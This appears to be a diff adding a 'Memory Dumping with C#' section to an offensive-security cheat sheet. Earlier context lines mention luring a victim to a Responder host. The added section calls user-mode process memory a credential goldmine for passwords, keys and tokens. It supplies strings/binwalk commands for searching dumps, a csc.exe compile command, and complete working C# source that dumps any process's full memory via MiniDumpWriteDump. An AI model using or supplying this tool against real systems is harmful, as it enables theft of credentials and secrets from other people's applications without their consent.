@@ -1535,3 +1535,93 @@ Launch Responder.<br />
 
 Lure the victim to request the URL, where www.my.lab is the attacking host running Responder.<br />
 (e.g.) `http://www.my.lab/images/image.png`
+
+## >> Memory Dumping with C#
+
+Many are familiar with dumping lsass to get Windows credentials.  However, user mode processes are a credential goldmine as well (mail clients, VPN clients, file transfer clients, terminal emulators, etc).  If the application doesn't employ defensive programming, such as encrypting or clearing stack and heap variables, chances are good that you can detect user names, passwords, private keys, tokens, and so on.  Once you have a Windows process dump file you can use several Linux tools to inspect the data:
+
+```
+strings <dump file>
+strings -e l <dumpfile>
+binwalk <fump file>
+```
+
+The following program `jamd.cs` can be compiled with Windows CSharp compiler (csc.exe) like so.<br />
+`c:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -out:C:\temp\jamd.exe C:\temp\jamd.cs`
+
+THe program can be executed like this `C:\temp\jamd.exe 1234 c:\temp\proc.dmp`
+
+```csharp
+// Just Another Memory Dumper
+
+using System;
+using System.Runtime.InteropServices;
+using System.IO;
+using System.Diagnostics;
+
+namespace Jamd
+{
+   class JamdProgram
+   {
+      private const int MiniDumpWithFullMemory = 0x00000002;
+
+      [DllImport("dbghelp.dll", SetLastError = true)]
+      static extern bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId, SafeHandle hFile, uint DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);
+
+      private static void DumpMem(IntPtr hProc, int PID, string DumpFile)
+      {
+         try
+         {
+            bool status;
+
+            using(FileStream fs = new FileStream(DumpFile, FileMode.Create, FileAccess.ReadWrite, FileShare.Write))
+            {
+               status = MiniDumpWriteDump(hProc, PID, fs.SafeFileHandle, MiniDumpWithFullMemory, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
+            }
+            if(status)
+            {
+               Console.WriteLine("Dump of PID {0} saved to {1}", PID, DumpFile);
+            }
+            else
+            {
+               Console.WriteLine("Process memory dump failed.");
+            }
+         }
+         catch(Exception ex)
+         {
+            Console.WriteLine("DumpMem failed, error: {0}", ex.Message);
+         }
+      }
+
+      private static void Main(string[] args)
+      {
+         try
+         {
+            if(args.Length != 2)
+            {
+               Console.WriteLine("Usage: jamd.exe <PID> <dump file>");
+            }
+            else
+            {
+               int pid = Convert.ToInt32(args[0]);
+               string dumpfile = String.Copy(args[1]);
+               try
+               {
+                  Process process = Process.GetProcessById(pid);
+                  DumpMem(process.Handle, pid, dumpfile);
+               }
+               catch(Exception ex)
+               {
+                  Console.WriteLine("Jamd failed, error: {0}", ex.Message);
+               }
+            }
+         }
+         catch(Exception ex)
+         {
+            Console.WriteLine("Jamd failed, error: {0}", ex.Message);
+         }
+      }
+   }
+}
+```
+
